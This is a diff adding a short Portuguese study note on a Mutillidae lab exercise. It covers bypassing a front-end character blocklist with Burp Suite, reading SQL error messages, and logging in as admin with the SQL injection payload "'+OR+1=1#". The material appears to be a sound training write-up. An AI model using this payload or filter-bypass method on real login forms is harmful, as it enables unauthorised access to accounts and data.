@@ -1,0 +1,37 @@
+VAMOS CONTORNAR MECANISMOS DE FILTRAGEM PARA CONTORNARMOS OS MECANISMOS DE AUTENTIFICAÇÃO.
+
+<MUTILLIDAE>
+OWASP 2017 > A1 INJECTION > SQLi BYPASS AUTHENTICATION
+
+CASO DE ALGUM ERRO DEVEMOS LIMPAR NOSSOS COOKIES EM STORAGE.
+
+Vamos mudar o toogle security para aumentar o nível de segurança.
+    |-> O mecanismo de defesa não deixa colocar caracteres especiais.
+
+Ou seja, no front-end tem um blocklist de caracteres.
+
+Para contornar isso podemos fazer uma validação de caracteres normais e interceptar 
+com o web proxy(BurpSuite).
+
+OBS: Se o backend não filtrar podemos enviar qualquer caracteres.
+
+Ex:
+username = teste
+password = teste123
+Interceptamos com o BurpSuite
+
+Resposta: username=bwapp&password=pass123&login-php-submit-button=Login
+            |-> Podemos passar o payload sql aqui.
+            |-: username=bwap'
+
+Vamos testar uma aspas simples no username.
+    Retorno: Query: SELECT username FROM accounts WHERE username='bwapp''; (0) [Exception]
+
+Vamos testar agora uma aspas simples no password para ver a resposta.
+    Retorno: Query: SELECT * FROM accounts WHERE username='bwapp' AND password='pass123'' (0) [Exception] 
+
+
+Sabendo a query que está sendo enviado para o banco de dados agora vamos fazer nossa injeção.
+Injeção: '+OR+1=1#
+
+Estamos logado como admin!!!!
